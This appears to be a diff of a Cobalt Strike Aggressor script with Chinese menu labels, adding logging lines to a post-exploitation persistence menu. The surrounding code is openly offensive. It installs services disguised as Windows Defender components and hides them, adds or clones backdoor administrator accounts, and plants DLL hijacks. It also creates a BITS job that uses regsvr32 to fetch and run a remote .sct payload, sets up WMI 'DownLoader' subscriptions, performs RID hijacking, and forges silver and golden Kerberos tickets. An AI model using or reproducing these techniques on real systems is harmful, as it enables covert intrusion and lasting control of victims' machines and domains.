@@ -1,6 +1,7 @@
 menu "☆ 权限维持"{
 	menu "EasyPersistent" {
 		item "设置常用路径" {
+			blog($1, "\c9=========== 设置常用路径 ==========");
 			local('$bid');
 			foreach $bid ($1){
 				prompt_text("文件路径?", $filePath, {
@@ -17,6 +18,7 @@ menu "☆ 权限维持"{
 
 		menu "文件控制"{  
 			item "文件属性" {
+			blog($1, "\c9=========== 文件属性 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("文件属性控制 attrib",%(filePath => $filePath, Action => "属性查看",bid => $bid),lambda({
@@ -48,7 +50,8 @@ menu "☆ 权限维持"{
 					dialog_show($Dialog);
 			}}
 			
-			item "文件权限" { 
+			item "文件权限" {
+			blog($1, "\c9=========== 文件权限 =========="); 
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -83,6 +86,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "文件链接" {
+			blog($1, "\c9=========== 文件链接 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -197,6 +201,7 @@ menu "☆ 权限维持"{
 
 		menu "系统服务" {
 			item "添加服务" {
+			blog($1, "\c9=========== 添加服务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$filePath = "C:\\windows\\Temp\\".randomFileName().".exe";
@@ -218,6 +223,7 @@ menu "☆ 权限维持"{
 			}
 
 			item "修改服务" {
+			blog($1, "\c9=========== 修改服务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Servers Auto Run",%(servicename => "Wdfup", displayname => "Windows Defender Antivirus Update Service", binpath => "$filePath" ,description => "Windows Defender kernel support.",bid => $bid),&ChangeAutoService);
@@ -232,6 +238,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "设置SDDL" {
+			blog($1, "\c9=========== 设置SDDL ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Edit Service SDDL",%(servicename => "Wdfup",SDDL => "隐藏",bid => $bid),&HiddenService);
@@ -245,6 +252,7 @@ menu "☆ 权限维持"{
 			
 			#移除注册表, sc 删除
 			item "删除服务" {
+			blog($1, "\c9=========== 删除服务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Delete Service",%(servicename => "Wdfup",bid => $bid),&DeleteService);
@@ -256,6 +264,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "查询服务" {
+			blog($1, "\c9=========== 查询服务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Delete Service",%(servicename => "Wdfup",type => "all",state => "active",qtype => "query",bid => $bid),&QService);
@@ -272,6 +281,7 @@ menu "☆ 权限维持"{
 
 		menu "用户操作" {
 			item "查询用户" {
+				blog($1, "\c9=========== 查询用户 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					bnet($bid, "user");
@@ -281,6 +291,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "添加用户" {
+				blog($1, "\c9=========== 添加用户 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("添加用户",%(user => "Yanghao",pass => "Yanghao@123$",localgroups => "Administrators",addtype => "NET",bid => $bid),&AdUser);
@@ -295,6 +306,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "克隆用户" {
+				blog($1, "\c9=========== 克隆用户 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("CloneUser",%(user => "Yanghao",pass => "Yanghao@123$",cloneuser => "Administrator",bid => $bid),&CloneUser);
@@ -308,6 +320,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "删除用户" {
+				blog($1, "\c9=========== 删除用户 ==========");
 				local('$bid');
 				foreach $bid ($1){					
 					$Dialog = dialog("User Delete",%(user => "Yanghao",type => "NET",bid => $bid),&DeleteUser);
@@ -320,6 +333,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "用户激活与禁用" {
+				blog($1, "\c9=========== 用户激活与禁用 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("禁用/激活用户",%(user => "Guest",pass => "Yanghao@123$",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&EnGuest);
@@ -337,6 +351,7 @@ menu "☆ 权限维持"{
 
 		menu "启动目录" {
 			item "查询启动目录" {
+				blog($1, "\c9=========== 查询启动目录 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -358,6 +373,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "写入启动目录" {
+				blog($1, "\c9=========== 写入启动目录 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -415,6 +431,7 @@ menu "☆ 权限维持"{
 
 		menu "计划任务"{
 			item "查询计划任务" {
+				blog($1, "\c9=========== 查询计划任务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("添加计划任务",%(taskname => "MicrosoftEdgeUpdateTaskMachineCore" , bid => $bid) ,lambda({
@@ -441,6 +458,7 @@ menu "☆ 权限维持"{
 			}
 
 			item "AddCmdLine" {
+				blog($1, "\c9=========== AddCmdLine ==========");
 				local('$bid $user $taskname $level $is_admin');
 				foreach $bid ($1){
 					#如果是系统账户会忽略密码,用户要输入密码。/RU选项是为了方便从管理员到SYSTEM和SYSTEM创建任务。
@@ -481,6 +499,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "Add-TaskAPI" {
+				blog($1, "\c9=========== Add-TaskAPI ==========");
 				local('$bid $user $taskname $level $is_admin');
 				foreach $bid ($1){
 					#如果是系统账户会忽略密码,用户要输入密码。/RU选项是为了方便从管理员到SYSTEM和SYSTEM创建任务。
@@ -529,6 +548,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "删除计划任务" {
+				blog($1, "\c9=========== 删除计划任务 ==========");
 				local('$bid $user $taskname');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -796,6 +816,7 @@ menu "☆ 权限维持"{
 		menu "DLL加载"{
 			menu "Msdtc" {
 				item "上传oci.dll" {
+					blog($1, "\c9=========== 上传oci.dll ==========");
 					local('$bid');
 					foreach $bid ($1){
 					#选择cs自动生成的，选择本地存在的，
@@ -833,7 +854,8 @@ menu "☆ 权限维持"{
 				}
 
 				# MoveFileEx.dll  D:\ActivePart\Code\VS2019\CobaltStrike_script\Persistence\MSDTC
-				item "清理oci.dll"{
+				item "清理oci.dll" {
+					blog($1, "\c9=========== 清理oci.dll ==========");
 					local('$bid $ociFile $Data');
 					$ociFile = "C:\\windows\\system32\\oci.dll";
 					foreach $bid ($1){
@@ -856,7 +878,8 @@ menu "☆ 权限维持"{
 			
 			# https://www.cnblogs.com/websecyw/p/12561630.html
 			menu "Linkinfo" {
-				item "上传linkinfo.dll"{
+				item "上传linkinfo.dll" {
+					blog($1, "\c9=========== 上传linkinfo.dll ==========");
 					local('$bid');
 					foreach $bid ($1){
 						#binput($bid, "blockdlls start"); 
@@ -882,7 +905,8 @@ menu "☆ 权限维持"{
 					}
 				}
 				
-				item "清理linkinfo.dll"{
+				item "清理linkinfo.dll" {
+					blog($1, "\c9=========== 清理linkinfo.dll ==========");
 					local('$bid $TempFile');
 					$TempFile = "C:\\windows\\linkinfo.dll";
 					foreach $bid ($1){
@@ -925,8 +949,9 @@ menu "☆ 权限维持"{
 		}
 		}
 
-		menu "BITS任务"{
-			item "添加任务"{
+		menu "BITS任务" {
+			item "添加任务" {
+				blog($1, "\c9=========== 添加任务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$dialog = dialog("Bitsadmin 持久化", %(JobName => "WindowsUpdate", CmdLine => "regsvr32.exe /u /s /i:http://192.168.11.1:80/download/calc.sct scrobj.dll" ,bid => $bid), &bitsadmin);
@@ -938,7 +963,8 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "查询任务"{
+			item "查询任务" {
+				blog($1, "\c9=========== 查询任务 ==========");
 				#获取任务创建时间 bitsadmin /GetCreationTime <Job>
 				local('$bid');
 				foreach $bid ($1){
@@ -967,7 +993,8 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "删除任务"{
+			item "删除任务" {
+				blog($1, "\c9=========== 删除任务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("删除任务", %(JobName => "WindowsUpdate", bid => $bid), lambda({
@@ -999,6 +1026,7 @@ menu "☆ 权限维持"{
 		#WMI Event Subscription
 		menu "WMI事件" {
 			item "注册事件订阅" {
+				blog($1, "\c9=========== 注册事件订阅 ==========");
 				local('$bid');
 				foreach $bid ($1){	
 					$Dialog = dialog("WMI注册", %(EventFilterName => "WindowsUpdate_".ticks(), EventConsumerName => "DownLoader_" .ticks(), RunType => "CommandLine" , Trigger => "Timed", bid => $bid) ,  &RegWMI );
@@ -1013,6 +1041,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "检查事件订阅" {
+				blog($1, "\c9=========== 检查事件订阅 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("查看WMI事件订阅", %(NamespaceName => "root/subscription" , EventFilterName => "", EventConsumerName => "", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
@@ -1071,6 +1100,7 @@ menu "☆ 权限维持"{
 			}
 			
 			item "删除事件订阅" {
+				blog($1, "\c9=========== 删除事件订阅 ==========");
 				local('$bid');
 				foreach $bid ($1){	
 					$Dialog = dialog("删除WMI事件订阅", %(NamespaceName => "root/subscription" , EventFilterName => "WindowsUpdate", EventConsumerName => "DownLoader", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
@@ -2093,47 +2123,56 @@ menu "☆ 权限维持"{
 	}
 
 	separator();
-    item "CS 服务马"{
+    item "CS 服务马" {
+		blog($1, "\c9=========== CS 服务马 ==========");
         $bid = $1;
         servicebeacon($bid);
     }
 
-    item "Winrm 后门"{
+    item "Winrm 后门" {
+		blog($1, "\c9=========== Winrm 后门 ==========");
         $bid = $1;
         winrm_config($bid);
     }
 
-    item "Msdtc DLL 劫持"{
+    item "Msdtc DLL 劫持" {
+		blog($1, "\c9=========== Msdtc DLL 劫持 ==========");
         $bid = $1;
         msdtc($bid);
 
     }
     
-    item "Dnsadmin 后门"{
+    item "Dnsadmin 后门" {
+		blog($1, "\c9=========== Dnsadmin 后门 ==========");
         $bid = $1;
         dnsadmin_config($bid);
     }
 
 
-    item "WmiPrvSE 劫持"{
+    item "WmiPrvSE 劫持" {
+		blog($1, "\c9=========== WmiPrvSE 劫持 ==========");
         show_message("WmiPrvSE提权机会只有一次，失败就没了。一般系统运行只有一个WmiPrvSE.exe进程，当有超过一个WmiPrvSE.exe进程存在时。无法提权");
         WmiPrvSE_config($bid);
     }
     
-    item "CacheTask任务计划COM接口劫持"{
+    item "CacheTask任务计划COM接口劫持" {
+		blog($1, "\c9=========== CacheTask任务计划COM接口劫持 ==========");
         CacheTask($bid);
     }
     
     menu "RID劫持"{
-        item "本地windows用户RID查询"{
+        item "本地windows用户RID查询" {
+		blog($1, "\c9=========== 本地windows用户RID查询 ==========");
             ridquery($bid);
         }
         
-        item "RID劫持"{
+        item "RID劫持" {
+		blog($1, "\c9=========== RID劫持 ==========");
             ridrun($bid);
         }
     }
 	  item "白银票据" {
+		blog($1, "\c9=========== 白银票据 ==========");
     $bid = $1['@'];
 		$dialog = dialog("白银票据", %(user => "administrator", domain => "xxxx.com", sid => "sid", target => "dc.xxxx.com", rc4 => "NTLM", service => "cifs", bid => $bid), &SilverTicket);
     dialog_description($dialog, "生成白银票据，攻击者必须获得目标服务账号的密码ntml-hash值。");
@@ -2157,6 +2196,7 @@ menu "☆ 权限维持"{
   }
 
   item "黄金票据" {
+		blog($1, "\c9=========== 黄金票据 ==========");
     $bid = $1['@'];
 		$dialog = dialog("黄金票据", %(admin => "administrator", domain => "xxxx.com", sid => "sid", krbtgt => "NTLM", bid => $bid), &GoldenTicket);
     dialog_description($dialog, "生成黄金票据，攻击者必须获得krbtgt账户的ntml-hash值。");
